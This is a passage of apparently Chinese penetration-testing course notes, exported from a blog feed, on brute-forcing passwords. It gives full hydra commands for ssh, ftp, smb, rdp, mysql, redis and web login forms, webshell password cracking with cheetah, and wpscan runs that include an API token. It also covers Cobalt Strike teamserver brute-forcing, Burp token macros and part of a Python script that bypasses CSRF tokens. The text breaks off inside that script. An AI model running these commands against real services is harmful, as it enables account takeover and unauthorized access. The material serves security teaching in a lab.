MailCracker 进行破解</h3><p><strong>开启此工具之前记得关下火绒，不然打不开</strong></p><p><img src="/2021/08/03/60-zhi-day22/image-20210803134223840.png" alt="image-20210803134223840"></p><p>拿到账号密码后我们可以用foxmail软件登录</p><h3 id="163-qq-邮箱用脚本和mailcracker穷举"><a href="#163-qq-邮箱用脚本和mailcracker穷举" class="headerlink" title="163 qq 邮箱用脚本和mailcracker穷举"></a><strong>163</strong> qq 邮箱用脚本和mailcracker穷举</h3><p>163 qq 这些邮箱,并发会拦截，而且不能穷举太多。一般配合社工办法来穷举</p><p><strong>脚本</strong></p><p>我们把脚本 用户 密码 放到一个文件夹下</p><p><img src="/2021/08/03/60-zhi-day22/image-20210804172840723.png" alt="image-20210804172840723"></p><p>使用命令开始穷举</p><p>python email.py 163 user.txt pass.txt </p><p><img src="/2021/08/03/60-zhi-day22/image-20210804173031548.png" alt="image-20210804173031548"></p><p><strong>mailcracker工具</strong></p><p>也穷举出来了</p><p><img src="/2021/08/03/60-zhi-day22/image-20210804172037036.png" alt="image-20210804172037036"></p><h2 id="CobaltStrike-TeamServer-口令暴力破解"><a href="#CobaltStrike-TeamServer-口令暴力破解" class="headerlink" title="CobaltStrike TeamServer 口令暴力破解"></a><strong>CobaltStrike TeamServer</strong> 口令暴力破解</h2><blockquote><p>Cobalt Strike 是一款超级好用的渗透测试工具，拥有多种协议主机上线方式，集成了提权，凭据导出，端口转发，socket 代理，office 攻击，文件捆绑，钓鱼等多种功能。同时，Cobalt Strike 还可以调用 Mimikatz 等其他知名工具，因此广受技术大佬的喜爱。</p><p>Cobalt Strike 是由美国 Red Team 开发，官网地址：<a href="http://cobaltstrike.com/">http://cobaltstrike.com</a></p><p>这个工具的社区版是大家熟知的 Armitage(一个 MSF 的图形化界面工具)，而</p><p>Cobalt Strike 大家可以理解其为 Armitage 的商业版</p></blockquote><p>关于 Cobalt Strike 的口令暴力破解</p><p>众所周知 Cobalt Strike 的工作方式是以 TeamServer 为核心，可多个 Cilent 的 CS（Server Cilent）架构。</p><p>​    启动teamserver</p><pre class="line-numbers language-none"><code class="language-none">./teamserver 192.168.0.134 qweasd123<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>sh 可执行脚本 相当于windows bat文件</p><p>chmod +x 文件名.sh 添加权限</p><p>chmod -x 文件名.sh 删除权限</p><p>./文件名.sh 执行文件</p></blockquote><p>启动 temaerver 之后可以通过客户端连接连接服务器 默认的端口是 50050 密码是 qweasd123 即可登录。</p><p><img src="/2021/08/03/60-zhi-day22/image-20210804200623532.png" alt="image-20210804200623532"></p><p>如果把 teamserver 放在公网上，口令设置薄弱 可以通过对其穷举有一定的几率获取 teamserver 的权限，那么服务器里的被成功控制的机器，我们也可以对其控制。所以说危害是非常大的。</p><p>我们打开cobaltstrike 试试</p><p><img src="/2021/08/03/60-zhi-day22/image-20210804200951228.png" alt="image-20210804200951228"></p><p><img src="/2021/08/03/60-zhi-day22/image-20210804201005915.png" alt="image-20210804201005915"></p><p><img src="/2021/08/03/60-zhi-day22/image-20210804201028597.png" alt="image-20210804201028597"></p><p>接下来我们使用csbuster.py对50050端口进行穷举</p><p>我们在另一台kali上操作</p><p><strong>我们首先查看50050端口是否开放</strong></p><pre class="line-numbers language-none"><code class="language-none">nmap -p 50050 192.168.0.134<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>开放的</p><p><img src="/2021/08/03/60-zhi-day22/image-20210804201157076.png" alt="image-20210804201157076"></p><p><strong>查看脚本参数</strong></p><p><img src="/2021/08/03/60-zhi-day22/image-20210804201318677.png" alt="image-20210804201318677"></p><p><strong>使用写好的py脚本</strong></p><p>python3 csbuster.py 192.168.0.134 /root/桌面/12306top100.txt -t 20</p><p><img src="/2021/08/03/60-zhi-day22/image-20210804201339564.png" alt="image-20210804201339564"></p><p>线程20查不到我们可以尝试线程调小，发现穷举出来了密码</p><p>我们在本机就可以使用此账号密码登录cobaltstrike</p><p><img src="/2021/08/03/60-zhi-day22/image-20210804201650552.png" alt="image-20210804201650552"></p><h2 id="对-apache-tomcat进行穷举"><a href="#对-apache-tomcat进行穷举" class="headerlink" title="对 apache-tomcat进行穷举"></a>对 apache-tomcat进行穷举</h2><blockquote><p>Apache Tomcat 是世界上使用最广泛的 Java Web 应用服务器之一，绝大数人都会使用 Tomcat 的默认配置。然而默认配置中会有一个向外网开放的 Web 应用管理器，管理员可以利用它在服务器中启动、停止、添加和删除应用。</p></blockquote><p>默认8080，改成8081</p><p><img src="/2021/08/03/60-zhi-day22/image-20210804201852678.png" alt="image-20210804201852678"></p><p>登录进来后</p><p><img src="/2021/08/03/60-zhi-day22/image-20210804201956313.png" alt="image-20210804201956313"></p><p>我们可以使用msfconsole中的auxiliary/scanner/http/tomcat_mgr_login模块进行穷举</p><p>设置好参数</p><p><img src="/2021/08/03/60-zhi-day22/image-20210804202912968.png" alt="image-20210804202912968"></p><p><img src="/2021/08/03/60-zhi-day22/image-20210804202925684.png" alt="image-20210804202925684"></p><p>这样我们就能通过ip:端口的方式登录</p><h2 id="超级弱口令检查穷举使用"><a href="#超级弱口令检查穷举使用" class="headerlink" title="超级弱口令检查穷举使用"></a>超级弱口令检查穷举使用</h2><p>我们把俩个靶机的ip放进去，选择我们开的服务进行穷举</p><p><img src="/2021/08/03/60-zhi-day22/image-20210804203014904.png" alt="image-20210804203014904"></p>]]></content>
      
      
      <categories>
          
          <category> 穷举篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 穷举 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>穷举</title>
      <link href="/2021/08/02/60-zhi-day21/"/>
      <url>/2021/08/02/60-zhi-day21/</url>
      
        <content type="html"><![CDATA[<h1 id="穷举篇"><a href="#穷举篇" class="headerlink" title="穷举篇"></a>穷举篇</h1><span id="more"></span><h2 id="cheetah-对一句后门密码穷举"><a href="#cheetah-对一句后门密码穷举" class="headerlink" title="cheetah 对一句后门密码穷举"></a>cheetah 对一句后门密码穷举</h2><p>再kali上装上此工具</p><p>cheetah 是针对一句话后门的穷举工具</p><blockquote><p>python cheetah.py -u <a href="http://orz/orz.php">http://orz/orz.php</a></p><p>python cheetah.py -u <a href="http://orz/orz.jsp">http://orz/orz.jsp</a> -r post -n 1000 -v</p><p>python cheetah.py -u <a href="http://orz/orz.asp">http://orz/orz.asp</a> -r get -c -p data/pwd.list</p><p>python cheetah.py -u <a href="http://orz/orz">http://orz/orz</a> -w aspx -s iis -n 1000</p><p>python cheetah.py -b url.list -c -p pwd1.list pwd2.list -v</p><p>cheetah.py -u <a href="http://www.c1moon.com/a.php">http://www.c1moon.com/a.php</a> -n 1000 -v -p data/pwd.list</p><p>cheetah.py -u <a href="http://www.c1moon.com/a.asp">http://www.c1moon.com/a.asp</a> -n 1000 -v -p data/pwd.list</p><p>cheetah.py -u <a href="http://www.c1moon.com/a.aspx">http://www.c1moon.com/a.aspx</a> -n 1000 -v -p data/pwd.list</p><p>支持 asp php .net jsp 后门</p><p>-u 后门地址</p><p>-r 提交的方法 一般是 post</p><p>-n 一次提交密码的数量</p><p>-v 详细信息</p><p>-p 字典位置</p></blockquote><p><img src="/2021/08/02/60-zhi-day21/image-20210802125301337.png" alt="image-20210802125301337"></p><p>再文件夹位置运行终端执行</p><p>python cheetah.py -u <a href="http://www.c1moon.com/cmd.php">http://www.c1moon.com/cmd.php</a> -r post -n 1000 -v</p><p><img src="/2021/08/02/60-zhi-day21/image-20210802125631803.png" alt="image-20210802125631803"></p><p>扫面结果再data里的find.list查看</p><p><img src="/2021/08/02/60-zhi-day21/image-20210802125843196.png" alt="image-20210802125843196"></p><h2 id="wordpress-博客系统用户密码穷举"><a href="#wordpress-博客系统用户密码穷举" class="headerlink" title="wordpress 博客系统用户密码穷举"></a>wordpress 博客系统用户密码穷举</h2><p>wordpress 是知名的博客系统，在互联网上的占有量很大，所以一定要知道这套系统的弱口令穷举的方法。</p><p><a href="https://wpscan.com/">https://wpscan.com</a> 首先到这个网站注册账号和密码注册后获取 token</p><p>配置了kali的dns和host</p><p><strong>自动找账号信息</strong></p><p>wpscan –url <a href="http://www.redteam.com/">http://www.redteam.com/</a> -e u -P /root/top100password.txt –api-token xvA9gb6k7XgLGYMkhu8YBsLUHwfpWRvllISDppfwYDE</p><p><img src="/2021/08/02/60-zhi-day21/image-20210802132104577.png" alt="image-20210802132104577"></p><p><img src="/2021/08/02/60-zhi-day21/image-20210802132121759.png" alt="image-20210802132121759"></p><p><strong>手动收集 wordpress 用户信息 访问连接获取用户信息</strong></p><p><a href="http://www.redteam.com/wp-json/wp/v2/users">http://www.redteam.com/wp-json/wp/v2/users</a></p><p><img src="/2021/08/02/60-zhi-day21/image-20210802132555565.png" alt="image-20210802132555565"></p><p>这里实在物理机看的 没配dns解析 应该是admin和moonsec</p><p>获取信息可以再进行指定用户爆破</p><p>wpscan –url <a href="http://www.redteam.com/">http://www.redteam.com/</a> -U moonsec -P /root/top100password.txt –api-token xvA9gb6k7XgLGYMkhu8YBsLUHwfpWRvllISDppfwYDE</p><p><img src="/2021/08/02/60-zhi-day21/image-20210802132844496.png" alt="image-20210802132844496"></p><h2 id="常见的端口服务穷举"><a href="#常见的端口服务穷举" class="headerlink" title="常见的端口服务穷举"></a>常见的端口服务穷举</h2><h3 id="hydra密码穷举工具的使用"><a href="#hydra密码穷举工具的使用" class="headerlink" title="hydra密码穷举工具的使用"></a>hydra密码穷举工具的使用</h3><p>hydra(九头蛇) 是一个端口穷举服务器的工具</p><blockquote><p>可以扫描以下服务</p><p>adam6500 asterisk cisco cisco-enable cvs firebird ftp[s] http[s]-{head|get|post}http[s]-{get|post}-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s]ldap3[-{cram|digest}md5][s] memcached mongodb mssql mysql nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres radmin2 rdp redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey svn teamspeak telnet[s] vmauthd vnc xmpp</p></blockquote><p><strong>使用例子</strong></p><p>hydra -l user -P passlist.txt <a href="ftp://192.168.0.1/">ftp://192.168.0.1</a></p><p>hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAIN</p><p>hydra -C defaults.txt -6 pop3s://[2001:db8::1]:143/TLS:DIGEST-MD5</p><p>hydra -l admin -p password ftp://[192.168.0.0/24]/</p><p>hydra -L logins.txt -P pws.txt -M targets.txt ssh</p><p><strong>常用参数说明</strong></p><p>hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e ns]</p><p>[-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-f] [-s PORT] [-S] [-vV]</p><p>server service [OPT]</p><p>-R 继续从上一次进度接着破解</p><p>-S 大写，采用 SSL 链接</p><p>-s &lt;PORT&gt; 小写，可通过这个参数指定非默认端口</p><p>-l &lt;LOGIN&gt; 指定破解的用户，对特定用户破解</p><p>-L &lt;FILE&gt; 指定用户名字典</p><p>-p &lt;PASS&gt; 小写，指定密码破解，少用，一般是采用密码字典</p><p>-P &lt;FILE&gt; 大写，指定密码字典</p><p>-e&lt;ns&gt; 可选选项，n：空密码试探，s：使用指定用户和密码试探</p><p>-C &lt;FILE&gt; 使用冒号分割格式，例如“登录名:密码”来代替-L/-P 参数</p><p>-M &lt;FILE&gt; 指定目标列表文件一行一条</p><p>-o &lt;FILE&gt; 指定结果输出文件</p><p>-f 在使用-M 参数以后，找到第一对登录名或者密码的时候中止破解</p><p>-t &lt;TASKS&gt; 同时运行的线程数，默认为 16</p><p>-w &lt;TIME&gt; 设置最大超时的时间，单位秒，默认是 30s</p><p>-v / -V显示详细过程</p><p>server</p><p>目标 ip</p><p>service</p><p>指定服务名，支持的服务和协议：telnet ftp pop3[-ntlm] imap[-ntlm] smb smbnt http[s]-{head|get} http-{get|post}-form http-proxy cisco cisco-enable vnc ldap2 ldap3  mssql mysql oracle-listener postgres nntp socks5 rexec rlogin pcnfs snmp rsh cvs svn icq sapr3 ssh2 smtp-auth[-ntlm] pcanywhere teamspeak sip vmauthd firebird ncp afp等等</p><p>OPT</p><p>可选项</p><h3 id="hydra-穷举-ssh-服务"><a href="#hydra-穷举-ssh-服务" class="headerlink" title="hydra 穷举 ssh 服务"></a>hydra 穷举 ssh 服务</h3><p>-L 用户字典文件 -P 密码字典文件 -t 线程数 -vV 详细信息 -e ns 使用空口令使用指定用户和密码试探 192.168.163.143 你要穷举的 ip ssh 是服务 -o 保存文件-f 如果找到马上中断扫描</p><p>我们可以使用nmap查看ssh对应的22端口是否开放</p><p><img src="/2021/08/02/60-zhi-day21/image-20210802184443404.png" alt="image-20210802184443404"></p><p>我们使用如下的命令</p><p>hydra -l root -P /root/top100.txt -e ns -vV -t 1 -f 192.168.163.143 ssh </p><p><img src="/2021/08/02/60-zhi-day21/image-20210802184621404.png" alt="image-20210802184621404"></p><p>设置了-f，所以跑到正确的密码就会停下来高亮</p><p>类似这种</p><p><img src="/2021/08/02/60-zhi-day21/image-20210802184820329.png" alt="image-20210802184820329"></p><p>这是指定用户的，我们也可以编辑一个user.txt，扫描多个用户</p><p>我们再user.txt写上root和moonsec，用大写L即可</p><p>hydra -L user.txt -P /root/top100.txt -e ns -vV -t 1 -f 192.168.163.143 ssh </p><p><img src="/2021/08/02/60-zhi-day21/image-20210802185240140.png" alt="image-20210802185240140"></p><h3 id="hydra-穷举-ftp-服务"><a href="#hydra-穷举-ftp-服务" class="headerlink" title="hydra 穷举 ftp 服务"></a>hydra 穷举 ftp 服务</h3><p>hydra ip ftp -l 用户名 -P 密码字典 -t 线程(默认 16) -vV</p><p>hydra ip ftp -l 用户名 -P 密码字典 -e ns -vV</p><p>我们可以看到靶机存在ftp服务，成功登录了</p><p><img src="/2021/08/02/60-zhi-day21/image-20210802185700425.png" alt="image-20210802185700425"></p><p>用此命令穷举</p><p>hydra -l c5moon -P /root/top100.txt -e ns -vV 192.168.163.139 ftp  </p><p><img src="/2021/08/02/60-zhi-day21/image-20210802185548817.png" alt="image-20210802185548817"></p><h3 id="hydra-穷举-mysql-服务"><a href="#hydra-穷举-mysql-服务" class="headerlink" title="hydra 穷举 mysql 服务"></a>hydra 穷举 mysql 服务</h3><p>hydra ip mysql -l 用户名 -P 密码字典 -t 线程(默认 16) -vV</p><p>hydra ip mysql -l 用户名 -P 密码字典 -e ns -vV</p><p>hydra ip mysql -l 用户名 -P 密码字典 -e ns -vV -s 端口</p><p>在靶机上我们开了mysql</p><p><img src="/2021/08/02/60-zhi-day21/image-20210802190148824.png" alt="image-20210802190148824"></p><p>hydra -l root -P /root/top100.txt -e ns -vV -f  192.168.0.127 mysql</p><p><img src="/2021/08/02/60-zhi-day21/image-20210802190206693.png" alt="image-20210802190206693"></p><h3 id="hydra-穷举-smb-服务"><a href="#hydra-穷举-smb-服务" class="headerlink" title="hydra 穷举 smb 服务"></a>hydra 穷举 smb 服务</h3><p>我们用nmap看下靶机445端口是否开放</p><p>nmap -p 445 192.168.0.127</p><p><img src="/2021/08/02/60-zhi-day21/image-20210802190524879.png" alt="image-20210802190524879"></p><p>靶机上查看也是开放的</p><p><img src="/2021/08/02/60-zhi-day21/image-20210802190606146.png" alt="image-20210802190606146"></p><p><strong>单个穷举</strong></p><p>hydra -l administrator -P /root/top100.txt -e ns -vV -f  192.168.0.127 smb</p><p><img src="/2021/08/02/60-zhi-day21/image-20210802190815658.png" alt="image-20210802190815658"></p><p>我们可以通过此端口在物理机连接靶机</p><p><img src="/2021/08/02/60-zhi-day21/image-20210802191222878.png" alt="image-20210802191222878"></p><p><strong>批量穷举</strong></p><p>我们俩个靶机都开放了445端口，我们来批量扫描</p><p>我们把俩个ip写在ip.txt里面，通过-M参数来穷举</p><p><img src="/2021/08/02/60-zhi-day21/image-20210802191653798.png" alt="image-20210802191653798"></p><p>hydra -l administrator -P /root/top100.txt -e ns -vV -f  -M ip.txt  smb </p><p><img src="/2021/08/02/60-zhi-day21/image-20210802191827255.png" alt="image-20210802191827255"></p><p><img src="/2021/08/02/60-zhi-day21/image-20210802191841714.png" alt="image-20210802191841714"></p><p>可以通过-o参数把结果写在一个文件里</p><p>hydra -l administrator -P /root/top100.txt -e ns -vV -f  -M ip.txt  smb -o smb.txt</p><p><img src="/2021/08/02/60-zhi-day21/image-20210802191947897.png" alt="image-20210802191947897"></p><h3 id="hydra-穷举-rdp-服务"><a href="#hydra-穷举-rdp-服务" class="headerlink" title="hydra 穷举 rdp 服务"></a>hydra 穷举 rdp 服务</h3><p>rdp远程终端，可以远征连接靶机</p><p>我们现在俩个靶机上看是否开放了rdp服务</p><p><img src="/2021/08/02/60-zhi-day21/image-20210802192236857.png" alt="image-20210802192236857"></p><p><img src="/2021/08/02/60-zhi-day21/image-20210802192302683.png" alt="image-20210802192302683"></p><p>hydra -l administrator -P /root/top100.txt -e ns -vV -f  -M ip.txt  rdp</p><p><img src="/2021/08/02/60-zhi-day21/image-20210802192647875.png" alt="image-20210802192647875"></p><p><img src="/2021/08/02/60-zhi-day21/image-20210802192701423.png" alt="image-20210802192701423"></p><p>我们可以通过账号远程连接靶机</p><p><img src="/2021/08/02/60-zhi-day21/image-20210802192726942.png" alt="image-20210802192726942"></p><p><img src="/2021/08/02/60-zhi-day21/image-20210802192738422.png" alt="image-20210802192738422"></p><p><img src="/2021/08/02/60-zhi-day21/image-20210802192817352.png" alt="image-20210802192817352"></p><h3 id="hydra穷举-http-服务"><a href="#hydra穷举-http-服务" class="headerlink" title="hydra穷举 http 服务"></a>hydra穷举 http 服务</h3><p>eg：</p><p>hydra -l admin -P 2019_top100.txt -vV -f <a href="http://www.c1moon.com/">www.c1moon.com</a> http-post-form”/admin/index.php:user=^USER^&amp;ps=^PASS^&amp;action=login:login-error”</p><p>我们用如下命令穷举</p><p>hydra -l admin -P /root/top100.txt -vV -f <a href="http://www.c1moon.com/">www.c1moon.com</a> http-post-form “/admin/index.php:user=^USER^&amp;ps=^PASS^&amp;action=login:login-error”</p><p><img src="/2021/08/02/60-zhi-day21/image-20210802193148396.png" alt="image-20210802193148396"></p><h3 id="hydra穷举mssql服务"><a href="#hydra穷举mssql服务" class="headerlink" title="hydra穷举mssql服务"></a>hydra穷举mssql服务</h3><p>mssql即sql server </p><p>使用如下命令</p><p>hydra -l sa -P /root/top100.txt -e ns -vV -f 192.168.0.127 mssql</p><p><img src="/2021/08/02/60-zhi-day21/image-20210802194209202.png" alt="image-20210802194209202"></p><h3 id="hydra穷举redis服务"><a href="#hydra穷举redis服务" class="headerlink" title="hydra穷举redis服务"></a>hydra穷举redis服务</h3><p>俩个靶机都开放了redis，redis没有用户名，我们把l参数删掉即可</p><p>使用如下命令批量穷举</p><p>hydra -P /root/top100.txt -e ns -vV -f -M ip.txt redis   </p><p><img src="/2021/08/02/60-zhi-day21/image-20210802194401230.png" alt="image-20210802194401230"></p><h3 id="hydra-穷举-pop3-服务"><a href="#hydra-穷举-pop3-服务" class="headerlink" title="hydra 穷举 pop3 服务"></a>hydra 穷举 pop3 服务</h3><p>hydra -L user.txt -P qweasd123 192.168.52.6 smtp-vV -f</p><h3 id="hydra-穷举-http-proxy-服务"><a href="#hydra-穷举-http-proxy-服务" class="headerlink" title="hydra 穷举 http-proxy 服务"></a>hydra 穷举 http-proxy 服务</h3><p>hydra -l admin -P pass.txt http-proxy://10.36.16.18</p><h3 id="hydra-穷举-imap-服务"><a href="#hydra-穷举-imap-服务" class="headerlink" title="hydra 穷举 imap 服务"></a>hydra 穷举 imap 服务</h3><p>hydra -L user.txt -p secret 10.36.16.18 imap PLAIN</p><p>hydra -C defaults.txt -6 imap://[fe80::2c:31ff:fe12:ac11]:143/PLAIN</p><h3 id="hydra-穷举-telnet-服务"><a href="#hydra-穷举-telnet-服务" class="headerlink" title="hydra 穷举 telnet 服务"></a>hydra 穷举 telnet 服务</h3><p>hydra ip telnet -l 用户 -P 密码字典 -t 32 -s 23 -e ns -f -V</p><h2 id="xhydra穷举工具"><a href="#xhydra穷举工具" class="headerlink" title="xhydra穷举工具"></a>xhydra穷举工具</h2><p>xhydra 是 hydra 的可视化工具 使用简单方便快捷。kali终端输入 xhydra 即可使用。</p><p>基本界面如下</p><p><img src="/2021/08/02/60-zhi-day21/image-20210802195823344.png" alt="image-20210802195823344"></p><p><img src="/2021/08/02/60-zhi-day21/image-20210802195908440.png" alt="image-20210802195908440"></p><p><img src="/2021/08/02/60-zhi-day21/image-20210802195942339.png" alt="image-20210802195942339"></p><p><img src="/2021/08/02/60-zhi-day21/image-20210802200041383.png" alt="image-20210802200041383"></p><p><img src="/2021/08/02/60-zhi-day21/image-20210802200051810.png" alt="image-20210802200051810"></p><p>我们尝试穷举rdp服务如下：</p><p><img src="/2021/08/02/60-zhi-day21/image-20210802195703423.png" alt="image-20210802195703423"></p><p><img src="/2021/08/02/60-zhi-day21/image-20210802200138453.png" alt="image-20210802200138453"></p>]]></content>
      
      
      <categories>
          
          <category> 穷举篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cheetah </tag>
            
            <tag> hydra </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>穷举</title>
      <link href="/2021/07/27/60-zhi-day20/"/>
      <url>/2021/07/27/60-zhi-day20/</url>
      
        <content type="html"><![CDATA[<h1 id="穷举篇"><a href="#穷举篇" class="headerlink" title="穷举篇"></a>穷举篇</h1><span id="more"></span><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>穷举就是枚举的意思，在互联网的今天，需要使用某种的服务，大多数都需要口令登录，这个口令就是密码，密码的强度分为，弱口令 、中度口令、强度口令。如果登录的服务为弱口令，那会存在很大的安全隐患，黑客通过穷举弱口令对服务进行攻击，很容易就得到登录密码。得到密码之后就能登录服务，进行其他危害较大得操作。黑客也能通过对用户得信息整理，组合密码进行穷举攻击。例如根据用户的生日号码，出身年月日和姓名进行口令组合，再对其服务进行穷举。</p><h2 id="常见的服务"><a href="#常见的服务" class="headerlink" title="常见的服务"></a>常见的服务</h2><table><thead><tr><th align="left">服务</th><th>端口</th></tr></thead><tbody><tr><td align="left">FTP</td><td>21</td></tr><tr><td align="left">ssh</td><td>22</td></tr><tr><td align="left">telent</td><td>23</td></tr><tr><td align="left">smtp</td><td>25</td></tr><tr><td align="left">dns</td><td>53</td></tr><tr><td align="left">web</td><td>80</td></tr><tr><td align="left">pop3</td><td>110</td></tr><tr><td align="left">rpc</td><td>135</td></tr><tr><td align="left">NETBIOS</td><td>139</td></tr><tr><td align="left">imap</td><td>143</td></tr><tr><td align="left">http</td><td>443</td></tr><tr><td align="left">smb</td><td>445</td></tr><tr><td align="left">smtps</td><td>465</td></tr><tr><td align="left">rsync</td><td>873</td></tr><tr><td align="left">pop3s</td><td>995</td></tr><tr><td align="left">Microsoft SQL Server</td><td>1433</td></tr><tr><td align="left">oracle</td><td>1521</td></tr><tr><td align="left">mysql</td><td>3306</td></tr><tr><td align="left">远程终端rdp</td><td>3389</td></tr><tr><td align="left">PostgreSQL</td><td>5432</td></tr><tr><td align="left">redis</td><td>6379</td></tr><tr><td align="left">tomcat</td><td>8080</td></tr><tr><td align="left">memcached</td><td>11211</td></tr><tr><td align="left">mogodb</td><td>27018</td></tr><tr><td align="left">cobaltstrike teamserver</td><td>50050</td></tr></tbody></table><h2 id="burp-suite穷举后台密码"><a href="#burp-suite穷举后台密码" class="headerlink" title="burp suite穷举后台密码"></a>burp suite穷举<strong>后台</strong>密码</h2><p>我们使用burp+火狐对后台进行穷举</p><p><img src="/2021/07/27/60-zhi-day20/image-20210801135926683.png" alt="image-20210801135926683"></p><p>我们对登录的信息进行拦截</p><p><img src="/2021/07/27/60-zhi-day20/image-20210801140050644.png" alt="image-20210801140050644"></p><p><img src="/2021/07/27/60-zhi-day20/image-20210801140131294.png" alt="image-20210801140131294"></p><p>发送到intruder跑字典进行穷举</p><p><img src="/2021/07/27/60-zhi-day20/image-20210801140235538.png" alt="image-20210801140235538"></p><p><img src="/2021/07/27/60-zhi-day20/image-20210801140320060.png" alt="image-20210801140320060"></p><p><img src="/2021/07/27/60-zhi-day20/image-20210801140358743.png" alt="image-20210801140358743"></p><p>start后我们观察结果</p><p><img src="/2021/07/27/60-zhi-day20/image-20210801140430365.png" alt="image-20210801140430365"></p><p>这个状态和长度与众不同的很可能就是我们需要的正确密码</p><p>admin 123456 成功登录</p><p><img src="/2021/07/27/60-zhi-day20/image-20210801140513826.png" alt="image-20210801140513826"></p><h2 id="burp-suite穷举webshell密码"><a href="#burp-suite穷举webshell密码" class="headerlink" title="burp suite穷举webshell密码"></a>burp suite穷举webshell密码</h2><p>灰帽子对网站攻破后，一般会留后门方便对其网站进行非法管理。后门的程序语音包括 asp php .net 这些脚本文件放在网站目录， 一般都采用单密码进行登录。通过扫描获取 webshell 的后门的网址。得到网址后可以对其进行密码穷举。</p><p>我们这里准备了asp和aspx俩个webhell</p><p><img src="/2021/07/27/60-zhi-day20/image-20210801140719449.png" alt="image-20210801140719449"></p><p><img src="/2021/07/27/60-zhi-day20/image-20210801140741436.png" alt="image-20210801140741436"></p><p>跟上面没啥不同不演示了</p><p>登陆后是几个大马</p><p><img src="/2021/07/27/60-zhi-day20/image-20210801140921976.png" alt="image-20210801140921976"></p><p><img src="/2021/07/27/60-zhi-day20/image-20210801140948781.png" alt="image-20210801140948781"></p><h2 id="token防御的网站后台穷举密码"><a href="#token防御的网站后台穷举密码" class="headerlink" title="token防御的网站后台穷举密码"></a>token防御的网站后台穷举密码</h2><p>有的网站后台存在 token 值，这个 token 通俗的名字叫令牌，每次刷新页面都会随机变化。提交请求时必须携带这个 token 值，可以利用这点避免后台进行直接穷举和防止 csrf 攻击。</p><p><img src="/2021/07/27/60-zhi-day20/image-20210801141130099.png" alt="image-20210801141130099"></p><p>这个值随机变化，如果我们直接抓包跑字典会报错</p><h3 id="burp-suite-设置宏获取-token-对网站后台密码破解"><a href="#burp-suite-设置宏获取-token-对网站后台密码破解" class="headerlink" title="burp suite 设置宏获取 token 对网站后台密码破解"></a>burp suite <strong>设置宏获取</strong> <strong>token</strong> <strong>对网站后台密码破解</strong></h3><p>我们通过设置一个宏操作来动态的获取更改token</p><p><img src="/2021/07/27/60-zhi-day20/image-20210801141619363.png" alt="image-20210801141619363"></p><p><img src="/2021/07/27/60-zhi-day20/image-20210801141759145.png" alt="image-20210801141759145"></p><p>选择后跳转到设置宏的界面</p><p><img src="/2021/07/27/60-zhi-day20/image-20210801141928736.png" alt="image-20210801141928736"></p><p>我们增加宏操作</p><p><img src="/2021/07/27/60-zhi-day20/image-20210801142028072.png" alt="image-20210801142028072"></p><p>选择好界面后我们来设置configure，从而得到并更改我们intruder里面的token值</p><p><img src="/2021/07/27/60-zhi-day20/image-20210801142252761.png" alt="image-20210801142252761"></p><p>之后ok </p><p><img src="/2021/07/27/60-zhi-day20/image-20210801142324195.png" alt="image-20210801142324195"></p><p>再ok到</p><p><img src="/2021/07/27/60-zhi-day20/image-20210801142413972.png" alt="image-20210801142413972"></p><p>再箭头位置我们可以test我们的宏操作是否能获取到token值，再response里看token值是否变化</p><p>就不演示了</p><p>ok ok即可</p><p><img src="/2021/07/27/60-zhi-day20/image-20210801142722429.png" alt="image-20210801142722429"></p><p>再这里我们可以设置宏覆盖的范围</p><p><img src="/2021/07/27/60-zhi-day20/image-20210801144341016.png" alt="image-20210801144341016"></p><p><img src="/2021/07/27/60-zhi-day20/image-20210801181050714.png" alt="image-20210801181050714"></p><p>设置完毕之后我们开始跑字典</p><p>刚开始跑发现所有都是302，无法判断</p><p>我们设置这 </p><p><img src="/2021/07/27/60-zhi-day20/image-20210801144556852.png" alt="image-20210801144556852"></p><p>然后再跑</p><p><img src="/2021/07/27/60-zhi-day20/image-20210801144626428.png" alt="image-20210801144626428"></p><p>显然这个就是密码了</p><p><img src="/2021/07/27/60-zhi-day20/image-20210801144640755.png" alt="image-20210801144640755"></p><p><img src="/2021/07/27/60-zhi-day20/image-20210801144645935.png" alt="image-20210801144645935"></p><p>每一个token也不一样，再次验证了我们的宏执行了</p><h2 id="编写脚本获取-token-对网站后台密码破解"><a href="#编写脚本获取-token-对网站后台密码破解" class="headerlink" title="编写脚本获取 token 对网站后台密码破解"></a>编写脚本获取 <strong>token</strong> 对网站后台密码破解</h2><p><img src="/2021/07/27/60-zhi-day20/image-20210801202218549.png" alt="image-20210801202218549"></p><p>我们每次访问这个页面user_token都会变化，导致不能重复提交</p><p>我们分析它的原理，发现页面每次生成的user_token都存在session里面，每次登录从 session 里取出来，然后验证。如果验证成功 就进行密码匹配。如果验证不成功就输出 csrf 错误。</p><p><img src="/2021/07/27/60-zhi-day20/image-20210801202411286.png" alt="image-20210801202411286"></p><p>脚本:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#coding:utf-8</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> reurl <span class="token operator">=</span> <span class="token string">"http://www.c3moon.com/login.php"</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token punctuation">:</span>session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>req<span class="token operator">=</span>session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>user_token<span class="token operator">=</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"[a-z0-9]{32}"</span><span class="token punctuation">,</span>req<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">#32md5</span>data<span class="token 